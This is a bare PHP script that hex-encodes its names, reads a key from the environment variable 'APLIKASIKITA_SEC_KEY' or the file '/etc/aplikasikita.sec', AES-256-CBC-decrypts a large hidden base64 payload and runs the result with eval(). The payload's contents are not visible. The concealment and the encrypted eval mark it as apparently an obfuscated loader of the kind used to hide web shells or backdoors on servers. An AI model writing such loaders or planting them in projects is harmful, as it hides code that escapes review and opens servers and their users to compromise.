<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('mwlRp5Z+L4/xYd+USuyGlg==');

$c=base64_decode(

'Hg+1S/BTT2u8UQrnXanK2vcPy+IygyFLtotHs73SkIOIBjf7rXXU6EJ64/+1+nA2twZJqxtHu7mm' .
'lcMUvExwFfqjEw9Q1ejehS/xQDQobsPQgHg3HWzARcF33te6sW2MUe63J9Y+BDUl7VI6f2LYEhg/' .
'B8UzXbRcKwLVCbkDo2k2R1xng51W/gN0QT4GxNCbhS3faZwhUp0LJJVEuS3QGMchhrZuDbBChpA+' .
'05DSW73eSEnyhKtf/p4Q2NpRUoLolcpDuR4Z+T2hgs6kVf6dNV79DJ6e1khKFlapkQtPXo0wWTOa' .
'3CN25ljmD/zWTD9xRZTLC6o+3EtP8az6WN1RTpU3GHVx250F2mEfAegyMH/XFQzy3fWf6UpZwue1' .
'fqTTwXw50CAEJou1/q0jNhaMbD0RBdju8NBGmWGD4IDM6i7O9spSWsvMAZLyE7jTJCx2wBocrNu5' .
'jbIXTri11DS6PDUUV4Dz2njWylxr+8x8jvOnIjhddFzwM8vVWqA4YEbbT+ayRmzlDmYL1WqewzCU' .
'IgqOGWo0PmeGaVGJcSzK/0U8k1g23eSpfNE7X5ItNeMeP43tnAOGeso6YiDxoYxUDGev2Y37xZ3X' .
'38WBv2IRMAOBSEDtv+D8+DLGb+mzUcC9reeDMlkiWoz6zUXl9KlMe/JghFirq+/7Ad4mWd8vc+OC' .
'zP7ALyuNYdL16pZyJB0SaH+drV9YIxxWl+INbAf9uWTt1SL2kHga2N3jqLdJwtNYZ6MJ77L/BN9a' .
'jpn8ubP5QNojZ2HbPOjbLiboFJzTepSVlvGWTP6d1oPrRamYdaI8cfV/hh1AjNNqeEOePZRNKSdz' .
'vjn6kVbPZNKjN2WTJeUmNxTl3k9cRzZex/hy2yVLIaYqsmPjyrPHLoIYLwgUrNB0jsIt2CmhpdPe' .
'FvJzamaxV2QnHI4u+wzu7kkPQKE0Mo9GR7dByvnMMcvo1W+CuJHfl1YfFBWd2OGbkgIi7sKeUYdO' .
'0lVamJTd+sgj53hYnHnoCHwxe1bRPtTqfiP1cc67O7jyUOw8OuDtg5yq9r7czHxE7Hvmo7qpGJyU' .
'ZaYSP5TQXS289ibBuHb0Zk7A96hCR4AG3zUbSOqhJOZlZKGB6QmaPAqDmtpnZenNEyfHNmLhtL+H' .
'JBh9ECUjsvLxHFAJuSyGHQVIKgZbOc1Ft71cE81mZGQ4JOTy3wJcMpWXWwdNumj68f0WdndOjsJZ' .
'cpHGyhvcs8FJZbg5y5IbKgizrILzp6cAURX2VZY8klRY/UPZVVG5J4HJAOsSz8kJ38qQmWIWtCDk' .
'VwHW4M2W7UCJ9NJZkVRgajN7fsKQk6rH58Pzd/tf68o3a3eTHQxdanssYX6tzD+umPjdSKMEGw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

